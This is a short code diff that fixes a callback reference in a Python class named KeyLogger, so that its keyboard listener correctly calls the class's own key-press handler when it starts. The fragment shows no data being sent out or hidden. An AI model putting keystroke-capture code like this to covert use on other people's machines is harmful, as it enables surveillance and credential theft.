@@ -33,5 +33,5 @@ class KeyLogger:
         """
         Starts logging key presses
         """
-        listener = Listener(on_press=_keypress_callback)
+        listener = Listener(on_press=self._keypress_callback)
         listener.start()
